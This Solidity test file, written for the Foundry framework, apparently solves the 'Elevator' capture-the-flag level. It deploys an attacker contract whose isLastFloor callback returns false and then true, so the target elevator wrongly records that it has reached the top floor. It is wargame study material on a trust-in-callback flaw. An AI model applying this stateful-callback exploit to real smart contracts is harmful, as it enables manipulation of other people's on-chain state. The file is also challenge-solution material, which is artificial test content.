// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/11-Elevator.sol";

contract ElevatorTest is Test {
    Elevator public elevatorCTF;
    ElevatorAttacker public elevatorAttacker;

    function setUp() public {
        elevatorCTF = new Elevator();
        elevatorAttacker = new ElevatorAttacker(elevatorCTF);
    }

    function testAttack() public {
        // get to the top
        elevatorAttacker.attack();

        assertEq(elevatorCTF.top(), true);
    }
}

contract ElevatorAttacker is Building {
    Elevator public elevatorCTF;
    bool firstCall = true;

    constructor(Elevator _elevatorCTF) {
        elevatorCTF = _elevatorCTF;
    }

    function attack() public {
        elevatorCTF.goTo(42);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        if (firstCall) {
            firstCall = false;
            return false;
        } else {
            return true;
        }
    }
}
